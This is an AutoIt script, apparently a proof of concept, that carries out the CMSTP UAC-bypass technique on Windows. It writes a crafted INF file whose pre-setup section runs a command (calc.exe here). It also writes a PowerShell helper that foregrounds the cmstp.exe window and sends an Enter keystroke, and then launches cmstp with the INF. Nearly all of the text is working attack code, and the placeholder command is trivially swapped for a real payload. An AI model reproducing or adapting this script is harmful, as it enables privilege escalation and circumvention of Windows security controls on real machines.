#include <Array.au3>
#include <File.au3>

;First write out our INF File
Local $inf_contents = '[version]' & @CRLF & _
		  'Signature=$chicago$' & @CRLF & _
		  'AdvancedINF=2.5' & @CRLF & _
		  ' ' & @CRLF & _
		  '[DefaultInstall]' & @CRLF & _
		  'CustomDestination=CustInstDestSectionAllUsers' & @CRLF & _
		  'RunPreSetupCommands=RunPreSetupCommandsSection' & @CRLF & _
		  ' ' & @CRLF & _
		  '[RunPreSetupCommandsSection]' & @CRLF & _
		  'calc.exe' & @CRLF & _
		  'taskkill /IM cmstp.exe /F' & @CRLF & _
		  ' ' & @CRLF & _
		  '[CustInstDestSectionAllUsers]' & @CRLF & _
		  '49000,49001=AllUSer_LDIDSection, 7' & @CRLF & _
		  ' ' & @CRLF & _
		  '[AllUSer_LDIDSection]' & @CRLF & _
		  '"HKLM", "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""' & @CRLF & _
		  ' ' & @CRLF & _
		  '[Strings]' & @CRLF & _
		  'ServiceName="bypassit"' & @CRLF & _
		  'ShortSvcName="bypassit"' & @CRLF
FileWrite("C:\Windows\Tasks\cmstp.ini", $inf_contents)		  
;Second write out powershell Script
Local $powershell_contents = 'add-type -AssemblyName System.Windows.Forms' & @CRLF & _
		  '' & @CRLF & _
		  '$ps = new-object system.diagnostics.processstartinfo "c:\windows\system32\cmstp.exe"' & @CRLF & _
		  '$ps.Arguments = "/au C:\Windows\Tasks\cmstp.ini"' & @CRLF & _
		  '$ps.UseShellExecute = $false' & @CRLF & _
		  '' & @CRLF & _
		  '[system.diagnostics.process]::Start($ps)' & @CRLF & _
		  '' & @CRLF & _
		  'Start-Sleep -Milliseconds 100' & @CRLF & _
		  '' & @CRLF & _
		  'do' & @CRLF & _
		  '{' & @CRLF & _
		  '	# Do nothing until cmstp is an active window' & @CRLF & _
		  '}' & @CRLF & _
		  'until (Get-Process -Name "cmstp")' & @CRLF & _
		  '' & @CRLF & _
		  'Add-Type @"' & @CRLF & _
		  '    using System;' & @CRLF & _
		  '    using System.Runtime.InteropServices;' & @CRLF & _
		  '    public class WinAp {' & @CRLF & _
		  '      [DllImport(\"user32.dll\")]' & @CRLF & _
		  '      [return: MarshalAs(UnmanagedType.Bool)]' & @CRLF & _
		  '      public static extern bool SetForegroundWindow(IntPtr hWnd);' & @CRLF & _
		  '' & @CRLF & _
		  '      [DllImport(\"user32.dll\")]' & @CRLF & _
		  '      [return: MarshalAs(UnmanagedType.Bool)]' & @CRLF & _
		  '      public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);' & @CRLF & _
		  '    }' & @CRLF & _
		  '"@' & @CRLF & _
		  '' & @CRLF & _
		  '$p = Get-Process -Name "cmstp"' & @CRLF & _
		  '$h = $p.MainWindowHandle' & @CRLF & _
		  '    [void] [WinAp]::SetForegroundWindow($h)' & @CRLF & _
		  '    [void] [WinAp]::ShowWindow($h, 3)' & @CRLF & _
		  '' & @CRLF & _
		  '' & @CRLF & _
		  '[System.Windows.Forms.SendKeys]::SendWait("{ENTER}")' & @CRLF
FileWrite("C:\Windows\Tasks\cmstp.ps1", $powershell_contents)		  
RunWait('cmstp.exe /au C:\Windows\Tasks\cmstp.ini', @WorkingDir, @SW_SHOWNORMAL)
RunWait('powershell.exe -c "Start-Sleep -Milliseconds 200"', @WorkingDir, @SW_SHOWNORMAL)
RunWait('powershell.exe -c ''[System.Windows.Forms.SendKeys]::SendWait("{ENTER}")''', @WorkingDir, @SW_SHOWNORMAL)
;Finally invoke powershell
;When this command is run from regular command prompt, we can set execution policy and run the scrupt. However, autoit doesn't seem to do that... the Script is blocked
;RunWait('cmd.exe /c start powershell.exe -noexit -c "Set-ExecutionPolicy -ExecutionPolicy Unrestricted;C:\Windows\Tasks\cmstp.ps1"', @WorkingDir, @SW_SHOWNORMAL)

